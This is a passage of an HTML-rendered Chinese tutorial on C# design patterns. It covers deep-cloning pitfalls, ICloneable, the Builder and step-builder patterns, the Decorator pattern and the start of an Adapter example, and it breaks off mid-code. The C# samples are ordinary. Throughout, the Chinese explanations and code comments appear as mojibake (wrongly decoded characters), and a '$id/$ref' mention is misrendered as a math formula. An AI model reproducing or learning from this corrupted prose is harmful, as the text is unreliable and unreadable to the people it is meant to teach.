<p>æ³¨æ„ï¼šè‹¥å¯¹è±¡å›¾æœ‰å¾ªç¯å¼•ç”¨ï¼Œéœ€è¦è®¾ç½® ReferenceHandler å¹¶ç¡®è®¤ä½ çš„ .NET ç‰ˆæœ¬æ”¯æŒï¼ˆå¹¶ç†è§£åºåˆ—åŒ–æ ¼å¼ä¼šåŒ…å« <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>d</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">id/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mord">/</span></span></span></span></span>ref ç­‰æ ‡è®°ï¼‰ã€‚</p>
<ol start="0">
<li>ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼ˆä¾‹å¦‚ä½ æåˆ°çš„ CloneExtensionsï¼‰</li>
</ol>
<ul>
<li>å¸¸è§åšæ³•ï¼šå®‰è£… NuGet åŒ…ï¼ˆInstall-Package CloneExtensions æˆ–åº“åï¼‰ï¼Œä½¿ç”¨æ‰©å±•æ–¹æ³•å¦‚ Clone() / DeepClone()ã€‚ä¸åŒåº“ API ä¸åŒï¼Œæ‰€ä»¥åœ¨ä»£ç é‡Œè¦æŸ¥æ–‡æ¡£ç¡®è®¤æ–¹æ³•åä¸é€‰é¡¹ã€‚ ç¤ºä¾‹ï¼ˆä¼ªä»£ç ï¼Œç¤ºä¾‹ç”¨æ³•è¯·å‚ç…§å…·ä½“åº“æ–‡æ¡£ï¼‰ï¼š</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// NuGet: Install-Package CloneExtensions</span>
<span class="hljs-keyword">using</span> CloneExtensions;

<span class="hljs-keyword">var</span> copy = original.DeepClone(); <span class="hljs-comment">// æˆ– original.Clone()ï¼Œå–å†³äºåº“</span>
</code></pre>
<p>ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“å‰æ£€æŸ¥ï¼š</p>
<ul>
<li>æ˜¯å¦æ”¯æŒå¾ªç¯å¼•ç”¨ä¸å¯¹è±¡èº«ä»½ç»´æŠ¤ï¼ˆå³åŒä¸€ä¸ªå¼•ç”¨åœ¨æ–°å¯¹è±¡å›¾ä¸­ä»æ˜¯åŒä¸€æ–°å¯¹è±¡ï¼‰ï¼›</li>
<li>æ˜¯å¦ä¼šå¤åˆ¶äº‹ä»¶ã€å§”æ‰˜ã€é™æ€/éåºåˆ—åŒ–å­—æ®µï¼›</li>
<li>æ€§èƒ½ï¼šæœ‰äº›åº“ä½¿ç”¨åå°„æˆ–è¡¨è¾¾å¼æ ‘ç”Ÿæˆå™¨ï¼Œç¬¬ä¸€æ¬¡å…‹éš†å¯èƒ½æœ‰é¢„çƒ­ï¼›å¯¹äºçƒ­è·¯å¾„è¯·åšåŸºå‡†æµ‹è¯•ã€‚</li>
</ul>
<p>å…³äº ICloneable çš„è¡¥å……</p>
<ul>
<li>
<p>System.ICloneable çš„ Clone() æ²¡æœ‰è§„å®šæ˜¯æ·±è¿˜æ˜¯æµ…æ‹·è´ï¼Œå¯¼è‡´è¯­ä¹‰ä¸æ˜ç¡®ã€‚å»ºè®®ï¼š</p>
<ul>
<li>é¿å…ç›´æ¥å…¬å¼€ ICloneableï¼›å¦‚æœéœ€è¦å…¬å¼€ clone è¡Œä¸ºï¼Œè‡ªå®šä¹‰æ¥å£å¹¶å‘½åä¸º CloneDeepã€CloneShallow æˆ– IPrototypeã€‚</li>
<li>æˆ–è€…æä¾› Copy ctorï¼ˆæ‹·è´æ„é€ å‡½æ•°ï¼‰å’Œé™æ€å·¥å‚ From(original)ã€‚</li>
</ul>
</li>
</ul>
<p>å¸¸è§é™·é˜±ï¼ˆChecklistï¼‰</p>
<ul>
<li>äº‹ä»¶ (event) ä¸å§”æ‰˜ä¼šè¢«å¤åˆ¶/æˆ–å…±äº«ï¼Ÿé€šå¸¸ä¸åº”å¤åˆ¶äº‹ä»¶è®¢é˜…è€…ã€‚</li>
<li>åªè¯»å­—æ®µï¼ˆreadonlyï¼‰å’Œä¸å¯å˜å†…éƒ¨çŠ¶æ€å¦‚ä½•å¤åˆ¶ï¼Ÿ</li>
<li>å¾ªç¯å¼•ç”¨ï¼ˆA -&gt; B -&gt; Aï¼‰ä¼šå¯¼è‡´æ— é™å¤åˆ¶ï¼šè¦ä¹ˆæ‰‹åŠ¨å¤„ç†å¼•ç”¨ç¼“å­˜ï¼ˆæ˜ å°„æ—§-&gt;æ–°ï¼‰ï¼Œè¦ä¹ˆä½¿ç”¨æ”¯æŒå¼•ç”¨å¤„ç†çš„åº“/åºåˆ—åŒ–å™¨ã€‚</li>
<li>å¤šçº¿ç¨‹åœºæ™¯ï¼šå…‹éš†æ˜¯å¦éœ€è¦çº¿ç¨‹å®‰å…¨ï¼Ÿ</li>
<li>æ€§èƒ½ä¸å†…å­˜ï¼šæ·±æ‹·è´å¯èƒ½éå¸¸æ˜‚è´µï¼Œæ³¨æ„åœ¨æ€§èƒ½æ•æ„Ÿä»£ç ä¸è¦æ»¥ç”¨ã€‚</li>
</ul>
<p>å»ºè®®çš„å®ç°ç­–ç•¥ï¼ˆå®é™…é¡¹ç›®ï¼‰</p>
<ul>
<li>ç®€å•å¯¹è±¡/å€¼å¯¹è±¡ï¼šä½¿ç”¨æµ…æ‹·è´ï¼ˆMemberwiseCloneï¼‰æˆ–ç›´æ¥ newï¼ˆè‹¥æ„é€ æˆæœ¬ä½ï¼‰ã€‚</li>
<li>å¤æ‚å¯¹è±¡å›¾ä¸”éœ€è¦å®Œæ•´ç‹¬ç«‹å‰¯æœ¬ï¼šæ‰‹åŠ¨å®ç° Cloneï¼ˆæ¯ä¸ªç±»å®ç° Cloneï¼Œå¹¶åœ¨é¡¶å±‚é€’å½’è°ƒç”¨ï¼‰ï¼Œæˆ–é‡‡ç”¨å—ä¿¡ä»»çš„åº“ï¼ˆå‰ææ˜¯ä½ å·²ç»éªŒè¯å…¶è¯­ä¹‰å’Œæ€§èƒ½ï¼‰ã€‚</li>
<li>è‹¥ä½ éœ€è¦è·¨è¿›ç¨‹æˆ–æŒä¹…åŒ–ï¼šè€ƒè™‘åºåˆ—åŒ–æ–¹å¼ï¼ˆä½†æ³¨æ„å®‰å…¨ä¸æ€§èƒ½ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-71">å»ºé€ è€…æ¨¡å¼</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>å»ºé€ è€…æ¨¡å¼ï¼šæŠŠå¤æ‚å¯¹è±¡çš„æ„å»ºè¿‡ç¨‹ä»è¡¨ç¤ºä¸­åˆ†ç¦»å‡ºæ¥ï¼Œä½¿åŒæ ·çš„æ„å»ºè¿‡ç¨‹å¯ä»¥åˆ›å»ºä¸åŒçš„è¡¨ç¤ºã€‚</li>
</ul>
<p>è¦ç‚¹é€Ÿè§ˆ</p>
<ul>
<li>å¸¸ç”¨äºï¼šæ„é€ å‚æ•°å¤šã€ç»„åˆå¤æ‚ã€éœ€è¦ä¸€æ­¥æ­¥é…ç½®ã€éœ€è¦åœ¨ Build() æ—¶ç»Ÿä¸€æ ¡éªŒ/è®¾ç½®é»˜è®¤å€¼ã€‚</li>
<li>æ–¹æ³•é“¾ï¼ˆè¿”å› thisï¼‰æ˜¯å¸¸è§å®ç°æ–¹å¼ï¼Œä½†ä¸æ˜¯å”¯ä¸€å®ç°ã€‚</li>
<li>å¦‚æœéœ€è¦â€œå¼ºåˆ¶é¡ºåºâ€ï¼Œå¯ä»¥ç”¨ Step Builderï¼ˆç”¨æ¥å£é™åˆ¶ä¸‹ä¸€æ­¥å¯è°ƒç”¨çš„æ–¹æ³•ï¼‰æˆ– Directorï¼ˆæŒ‡æŒ¥è€…ï¼‰æ§åˆ¶æ­¥éª¤ã€‚</li>
</ul>
<h3 data-id="heading-72">ç¤ºä¾‹ 1ï¼šç»å…¸æµå¼ Builderï¼ˆæœ€å¸¸è§ï¼‰</h3>
<ul>
<li>ä¸­é—´æ–¹æ³•è¿”å› builderï¼ˆé€šå¸¸æ˜¯ thisï¼‰ï¼Œæœ€åè°ƒç”¨ Build() å¾—åˆ°ç›®æ ‡å¯¹è±¡ã€‚</li>
</ul>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Name { <span class="hljs-keyword">get</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> Age { <span class="hljs-keyword">get</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Address { <span class="hljs-keyword">get</span>; }

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Person</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name, <span class="hljs-built_in">int</span> age, <span class="hljs-built_in">string</span> address</span>)</span>
    {
        Name = name; Age = age; Address = address;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Builder</span>
    {
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> _name;
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> _age;
        <span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> _address;

        <span class="hljs-function"><span class="hljs-keyword">public</span> Builder <span class="hljs-title">WithName</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name</span>)</span> { _name = name; <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>; }
        <span class="hljs-function"><span class="hljs-keyword">public</span> Builder <span class="hljs-title">WithAge</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> age</span>)</span> { _age = age; <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>; }
        <span class="hljs-function"><span class="hljs-keyword">public</span> Builder <span class="hljs-title">WithAddress</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> address</span>)</span> { _address = address; <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>; }

        <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">Build</span>()</span>
        {
            <span class="hljs-comment">// åœ¨è¿™é‡Œåšæ ¡éªŒæˆ–é»˜è®¤å€¼è®¾ç½®</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(_name)) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidOperationException(<span class="hljs-string">"Name required"</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Person(_name, _age, _address);
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ï¼š</span>
<span class="hljs-keyword">var</span> p = <span class="hljs-keyword">new</span> Person.Builder()
            .WithName(<span class="hljs-string">"Alice"</span>)
            .WithAge(<span class="hljs-number">30</span>)
            .WithAddress(<span class="hljs-string">"Beijing"</span>)
            .Build();
</code></pre>
<p>è§£é‡Šï¼šä¸­é—´æ–¹æ³•è¿”å› Builderï¼ˆå³â€œè¿”å›ç±»æœ¬èº«â€ï¼‰ï¼Œæ”¯æŒé“¾å¼è°ƒç”¨ï¼›ä½†çœŸæ­£çš„äº§å“æ˜¯ Build() è¿”å›çš„ Personã€‚</p>
<h3 data-id="heading-73">ç¤ºä¾‹ 2ï¼šæç®€ç¤ºä¾‹â€”â€”Step Builderï¼ˆå¼ºåˆ¶é¡ºåºï¼‰</h3>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Sandwich</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Bread { <span class="hljs-keyword">get</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> Filling { <span class="hljs-keyword">get</span>; }
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Sandwich</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> b,<span class="hljs-built_in">string</span> f</span>)</span>{ Bread=b; Filling=f; }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IBread</span> { <span class="hljs-function">IFill <span class="hljs-title">WithBread</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> bread</span>)</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IFill</span>  { <span class="hljs-function">IBuild <span class="hljs-title">WithFilling</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> filling</span>)</span>; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IBuild</span> { <span class="hljs-function">Sandwich <span class="hljs-title">Build</span>()</span>; }

    <span class="hljs-keyword">class</span> <span class="hljs-title">Builder</span> : <span class="hljs-title">IBread</span>, <span class="hljs-title">IFill</span>, <span class="hljs-title">IBuild</span> {
        <span class="hljs-built_in">string</span> b,f;
        <span class="hljs-function"><span class="hljs-keyword">public</span> IFill <span class="hljs-title">WithBread</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> bread</span>)</span>{ b=bread; <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>; }
        <span class="hljs-function"><span class="hljs-keyword">public</span> IBuild <span class="hljs-title">WithFilling</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> filling</span>)</span>{ f=filling; <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>; }
        <span class="hljs-function"><span class="hljs-keyword">public</span> Sandwich <span class="hljs-title">Build</span>()</span> =&gt; <span class="hljs-keyword">new</span> Sandwich(b,f);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IBread <span class="hljs-title">NewBuilder</span>()</span> =&gt; <span class="hljs-keyword">new</span> Builder();
}

<span class="hljs-comment">// ç”¨æ³•ï¼ˆæŒ‰é¡ºåºå¼ºåˆ¶ï¼‰ï¼š </span>
<span class="hljs-keyword">var</span> s = Sandwich.NewBuilder().WithBread(<span class="hljs-string">"Wheat"</span>).WithFilling(<span class="hljs-string">"Ham"</span>).Build();
</code></pre>
<p>å°±æ˜¯è¿™æ ·ï¼šé“¾å¼æ–¹æ³•è¿”å› builderï¼ˆthisï¼‰ç”¨äºè¿ç»­é…ç½®ï¼ŒBuild() è¿”å›æœ€ç»ˆå¯¹è±¡ï¼›è‹¥éœ€å¼ºåˆ¶æ­¥éª¤ï¼Œç”¨ä¸åŒæ¥å£çº¦æŸè°ƒç”¨é¡ºåºã€‚</p>
<h2 data-id="heading-74">è£…é¥°å™¨è®¾è®¡æ¨¡å¼</h2>
<ul>
<li>è£…é¥°å™¨æ¨¡å¼ï¼šåœ¨è¿è¡Œæ—¶â€œç»™å¯¹è±¡å¤–é¢åŒ…ä¸€å±‚ï¼ˆæˆ–å¤šå±‚ï¼‰â€æ¥å¢åŠ åŠŸèƒ½ï¼ŒåŒ…è£¹åä»ç„¶åƒåŸæ¥é‚£ä¸ªç±»å‹ï¼Œå¯ä»¥éšæ—¶å åŠ æˆ–ç§»é™¤ã€‚</li>
</ul>
<p>ç”Ÿæ´»ç±»æ¯”</p>
<ul>
<li>å°±åƒç»™äººç©¿è¡£æœï¼šäººï¼ˆåŸå§‹å¯¹è±¡ï¼‰ä¸å˜ï¼Œå¤–é¢å¥—ä»¶ä¸åŒçš„è¡£æœï¼ˆè£…é¥°å™¨ï¼‰æ¥å¢åŠ åŠŸèƒ½ï¼ˆä¿æš–ã€é®æŒ¡ã€è£…é¥°ï¼‰ï¼Œå¯ä»¥éšæ—¶ç©¿/è„±ï¼Œå¤šä»¶å¯ä»¥å åŠ ã€‚</li>
</ul>
<p>æ ¸å¿ƒç‚¹ï¼ˆéå¸¸ç®€çŸ­ï¼‰</p>
<ul>
<li>ç”¨ç»„åˆï¼ˆæŠŠè¢«è£…é¥°å¯¹è±¡å­˜ä¸ºå­—æ®µï¼‰è€Œä¸æ˜¯ç»§æ‰¿æ¥æ‰©å±•åŠŸèƒ½ï¼›</li>
<li>è£…é¥°å™¨å®ç°ä¸è¢«è£…é¥°å¯¹è±¡ç›¸åŒçš„æ¥å£ï¼Œæ‰€ä»¥å¯ä»¥äº’æ¢ï¼›</li>
<li>è£…é¥°å™¨é€šå¸¸åœ¨è°ƒç”¨è¢«è£…é¥°å¯¹è±¡å‰åæ’å…¥é¢å¤–é€»è¾‘ï¼›</li>
<li>å¯ä»¥åœ¨è¿è¡Œæ—¶æŒ‰éœ€å åŠ å¤šä¸ªè£…é¥°å™¨ã€‚</li>
</ul>
<p>ç»“æ„ï¼ˆ4 ä¸ªè§’è‰²ï¼‰</p>
<ol start="0">
<li>Componentï¼šå…±åŒæ¥å£æˆ–æŠ½è±¡ç±»ï¼ˆå®¢æˆ·å’Œè£…é¥°å™¨éƒ½é€šè¿‡å®ƒäº¤äº’ï¼‰ã€‚</li>
<li>ConcreteComponentï¼šåŸå§‹å®ç°ï¼ˆè¦è¢«è£…é¥°çš„å¯¹è±¡ï¼‰ã€‚</li>
<li>Decoratorï¼ˆæŠ½è±¡è£…é¥°å™¨ï¼‰ï¼šå®ç° Component å¹¶æŒæœ‰ä¸€ä¸ª Component å¼•ç”¨ï¼Œé»˜è®¤æŠŠè¯·æ±‚è½¬å‘ç»™å†…éƒ¨å¯¹è±¡ã€‚</li>
<li>ConcreteDecoratorï¼šå…·ä½“è£…é¥°å™¨ï¼Œåœ¨å§”æ‰˜å‰åæ·»åŠ åŠŸèƒ½ã€‚</li>
</ol>
<p>æœ€å°å¯è¯» C# ç¤ºä¾‹ï¼ˆè¶³å¤ŸçŸ­ï¼Œé€è¡Œæ³¨é‡Šï¼‰</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å…±åŒæ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IService</span>
{
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>()</span>;
}

<span class="hljs-comment">// åŸå§‹å®ç°ï¼šè¦è¢«è£…é¥°çš„å¯¹è±¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">RealService</span> : <span class="hljs-title">IService</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"RealService: æ‰§è¡Œæ ¸å¿ƒé€»è¾‘"</span>);
    }
}

<span class="hljs-comment">// æŠ½è±¡è£…é¥°å™¨ï¼šæŒæœ‰ä¸€ä¸ª IService å¹¶å§”æ‰˜è°ƒç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title">ServiceDecorator</span> : <span class="hljs-title">IService</span>
{
    <span class="hljs-keyword">protected</span> IService Inner;
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">ServiceDecorator</span>(<span class="hljs-params">IService inner</span>)</span> { Inner = inner; }

    <span class="hljs-comment">// é»˜è®¤è¡Œä¸ºï¼šæŠŠè°ƒç”¨ä¼ ç»™å†…éƒ¨å¯¹è±¡</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>()</span> =&gt; Inner.Execute();
}

<span class="hljs-comment">// å…·ä½“è£…é¥°å™¨ï¼šåœ¨è°ƒç”¨å‰åå¢åŠ æ—¥å¿—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">LoggingDecorator</span> : <span class="hljs-title">ServiceDecorator</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">LoggingDecorator</span>(<span class="hljs-params">IService inner</span>) : <span class="hljs-title">base</span>(<span class="hljs-params">inner</span>)</span> { }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Execute</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"[Log] æ‰§è¡Œå‰"</span>);
        <span class="hljs-keyword">base</span>.Execute(); <span class="hljs-comment">// å§”æ‰˜ç»™è¢«è£…é¥°å¯¹è±¡ï¼ˆå¯èƒ½æ˜¯ RealService æˆ–å¦ä¸€ä¸ªè£…é¥°å™¨ï¼‰</span>
        Console.WriteLine(<span class="hljs-string">"[Log] æ‰§è¡Œå"</span>);
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
IService svc = <span class="hljs-keyword">new</span> RealService();
<span class="hljs-comment">// åœ¨è¿è¡Œæ—¶æŠŠæ—¥å¿—â€œåŒ…â€ä¸Šå»</span>
svc = <span class="hljs-keyword">new</span> LoggingDecorator(svc);
<span class="hljs-comment">// è¿˜å¯ä»¥å†åŒ…åˆ«çš„è£…é¥°å™¨ï¼šsvc = new AnotherDecorator(svc);</span>
svc.Execute();

<span class="hljs-comment">/* è¾“å‡ºï¼š
[Log] æ‰§è¡Œå‰
RealService: æ‰§è¡Œæ ¸å¿ƒé€»è¾‘
[Log] æ‰§è¡Œå
*/</span>
</code></pre>
<p>ä¸ºä»€ä¹ˆè¿™ä¸æ˜¯â€œé‡å†™ï¼ˆoverrideï¼‰+ baseâ€</p>
<ul>
<li>override æ˜¯é€šè¿‡å­ç±»åœ¨ç±»å‹å±‚æ¬¡ä¸­æ”¹å˜è¡Œä¸ºï¼ˆé™æ€å†³å®šï¼‰ï¼›base è°ƒç”¨çš„æ˜¯çˆ¶ç±»å®ç°ã€‚</li>
<li>è£…é¥°å™¨æ˜¯æŠŠç°æœ‰å¯¹è±¡å½“ä½œä¸€ä¸ªå®ä¾‹åŒ…èµ·æ¥ï¼Œè¿è¡Œæ—¶å¯ä»¥ä»»æ„ç»„åˆå¤šä¸ªè£…é¥°å™¨ï¼ˆç»„åˆ + å§”æ‰˜ï¼‰ï¼Œè€Œä¸æ˜¯åœ¨ç»§æ‰¿é“¾é‡Œå¢åŠ ä¸€ä¸ªå­ç±»ç‰ˆæœ¬ã€‚</li>
<li>è¯´ç™½äº†ï¼šé‡å†™æ˜¯åœ¨â€œå†…éƒ¨ä¿®æ”¹ç±»çš„è¡Œä¸ºâ€ï¼Œè£…é¥°å™¨æ˜¯åœ¨â€œå¤–é¢åŒ…ä¸€å±‚ã€åŠ¨æ€æ·»åŠ è¡Œä¸ºâ€ã€‚</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ç”¨è£…é¥°å™¨ï¼ˆç®€çŸ­å»ºè®®ï¼‰</p>
<ul>
<li>éœ€è¦åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ åŠŸèƒ½ï¼ˆæ¯”å¦‚æ—¥å¿—ã€ç¼“å­˜ã€æƒé™ã€é‡è¯•ç­‰ï¼‰ï¼›</li>
<li>æƒ³é¿å…ä¸ºæ¯ç§ç»„åˆå†™å¤§é‡å­ç±»ï¼›</li>
<li>å¸Œæœ›æŠŠæ¨ªåˆ‡å…³æ³¨ç‚¹æ‹†æˆå¯å¤ç”¨çš„å°å—ã€‚</li>
</ul>
<p>æ³¨æ„äº‹é¡¹ï¼ˆç®€çŸ­ï¼‰</p>
<ul>
<li>å±‚æ•°å¤ªå¤šä¼šè®©è°ƒè¯•å›°éš¾ï¼›</li>
<li>è£…é¥°å™¨åªèƒ½è®¿é—®æ¥å£æš´éœ²çš„ä¸œè¥¿ï¼Œæ— æ³•ç›´æ¥è®¿é—®è¢«è£…é¥°å¯¹è±¡çš„ç§æœ‰å®ç°ï¼ˆè¿™æ˜¯ä¼˜ç‚¹ä¹Ÿæ˜¯é™åˆ¶ï¼‰ï¼›</li>
<li>æ€§èƒ½æ•æ„Ÿè·¯å¾„æ³¨æ„è°ƒç”¨å¼€é”€ã€‚</li>
</ul>
<h2 data-id="heading-75">é€‚é…å™¨æ¨¡å¼</h2>
<p>ä¸€å¥è¯æ¦‚å¿µ</p>
<ul>
<li>é€‚é…å™¨æ¨¡å¼ï¼šæŠŠä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·æœŸæœ›çš„å¦ä¸€ä¸ªæ¥å£ï¼Œä½¿åŸæœ¬æ¥å£ä¸å…¼å®¹çš„ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚æ ¸å¿ƒæ˜¯â€œè®©å·²æœ‰ä»£ç ï¼ˆè¢«é€‚é…è€…ï¼‰åœ¨ä¸æ”¹åŠ¨å…¶ä»£ç çš„æƒ…å†µä¸‹ï¼Œè¢«æ–°çš„æ¥å£ä½¿ç”¨â€ã€‚</li>
</ul>
<p>ä»€ä¹ˆæ—¶å€™ç”¨</p>
<ul>
<li>éœ€è¦å¤ç”¨ç°æœ‰ç±»ä½†å…¶æ¥å£ä¸å½“å‰ç³»ç»Ÿä¸åŒ¹é…ã€‚</li>
<li>æƒ³æŠŠç¬¬ä¸‰æ–¹/é—ç•™åº“æ¥å…¥åˆ°æ–°çš„æ¥å£ä½“ç³»ä¸­ï¼Œé¿å…ä¿®æ”¹ç¬¬ä¸‰æ–¹ä»£ç ã€‚</li>
<li>æƒ³åœ¨ä¸åŒæ¨¡å—ä¹‹é—´åšåè®®æˆ–æ•°æ®æ ¼å¼çš„æ¡¥æ¥ã€‚</li>
</ul>
<p>ä¸¤ç§å¸¸è§å®ç°æ–¹å¼</p>
<ol start="0">
<li>
<p>å¯¹è±¡é€‚é…å™¨ï¼ˆObject Adapterï¼Œæ¨èåœ¨ C#/Java ä¸­ä½¿ç”¨ï¼‰</p>
<ul>
<li>é€šè¿‡ç»„åˆï¼šAdapter æŒæœ‰ä¸€ä¸ªè¢«é€‚é…å¯¹è±¡çš„å¼•ç”¨ï¼ŒAdapter å®ç°ç›®æ ‡æ¥å£å¹¶åœ¨å†…éƒ¨å§”æ‰˜ç»™è¢«é€‚é…å¯¹è±¡ï¼ˆå¯èƒ½åšè½¬æ¢ï¼‰ã€‚</li>
<li>ä¼˜ç‚¹ï¼šçµæ´»ï¼Œä¸æ”¹å˜è¢«é€‚é…ç±»ï¼Œæ”¯æŒé€‚é…å¤šä¸ªå…·ä½“å¯¹è±¡å®ä¾‹ã€‚</li>
</ul>
</li>
<li>
<p>ç±»é€‚é…å™¨ï¼ˆClass Adapterï¼‰</p>
<ul>
<li>é€šè¿‡ç»§æ‰¿ï¼šAdapter ç»§æ‰¿è¢«é€‚é…ç±»å¹¶å®ç°ç›®æ ‡æ¥å£ï¼ˆæˆ–åè¿‡æ¥ï¼‰ï¼Œç›´æ¥å¤ç”¨è¢«é€‚é…ç±»å®ç°ã€‚</li>
<li>åœ¨æ”¯æŒå•ç»§æ‰¿çš„è¯­è¨€ä¸­ï¼ˆå¦‚ C#ï¼‰å—é™ï¼šåªèƒ½ä»ä¸€ä¸ªå…·ä½“ç±»ç»§æ‰¿ï¼Œä¸åƒ C++ æ”¯æŒå¤šç»§æ‰¿é‚£æ ·çµæ´»ã€‚é€šå¸¸ä¸æ¨èåœ¨ C# ä¸­å¹¿æ³›ä½¿ç”¨ã€‚</li>
</ul>
</li>
</ol>
<p>æœ€å° C# ç¤ºä¾‹ï¼ˆå¯¹è±¡é€‚é…å™¨ï¼Œæ˜“è¯»ï¼‰</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å®¢æˆ·ç«¯æœŸæœ›çš„æ¥å£ï¼ˆTargetï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">ITarget</span>
{
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Request</span>()</span>; <span class="hljs-comment">// å®¢æˆ·ç«¯é€šè¿‡è¿™ä¸ªæ–¹æ³•ä½¿ç”¨æœåŠ¡</span>
}

<span class="hljs-comment">// ç°æœ‰çš„ã€æ¥å£ä¸åŒ¹é…çš„ç±»ï¼ˆAdapteeï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Adaptee</span>
{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SpecificRequest</span>()</span>
    {
        Console.WriteLine(<span class="hljs-string">"Adaptee: SpecificRequest è¢«è°ƒç”¨ï¼ˆæ¥å£ä¸åŒ¹é…ï¼‰"</span>);
    }
}

<span class="hljs-comment">// é€‚é…å™¨ï¼šå®ç° ITargetï¼Œå¹¶æŠŠè°ƒç”¨è½¬å‘/è½¬æ¢ç»™ Adaptee</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Adapter</span> : <span class="hljs-title">ITarget</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Adaptee _adaptee;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Adapter</span>(<span class="hljs-params">Adaptee adaptee</span>)</span> { _adaptee = adaptee; }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Request</span>()</span>
    {
        <span class="hljs-comment">// åœ¨è¿™é‡Œå¯ä»¥åšå‚æ•°/è¿”å›å€¼/åè®®è½¬æ¢</span>
        Console.WriteLine(<span class="hljs-string">"Adapter: åœ¨è°ƒç”¨å‰å¯ä»¥åšä¸€äº›è½¬æ¢æˆ–é¢„å¤„ç†"</span>);
